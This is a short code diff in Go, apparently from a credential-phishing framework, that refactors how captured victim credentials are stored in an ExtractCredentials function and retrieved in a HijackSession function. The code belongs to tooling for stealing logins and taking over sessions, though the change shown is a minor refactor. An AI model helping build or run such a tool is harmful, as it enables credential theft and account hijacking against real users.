@@ -446,7 +446,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
 						}
 
-						err := db.StoreVictimCreds(victim.ID, creds)
+						err := creds.Store(victim.ID)
 						if err != nil {
 							return false, err
 						}
@@ -500,7 +500,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	// get all the credentials
 	var credentials []db.VictimCredential
 	for i := 0; i < victim.CredsCount; i++ {
-		creds, _ := db.GetVictimCreds(victim.ID, i)
+		creds, _ := victim.GetCredentials(i)
 		credentials = append(credentials, *creds)
 	}
 
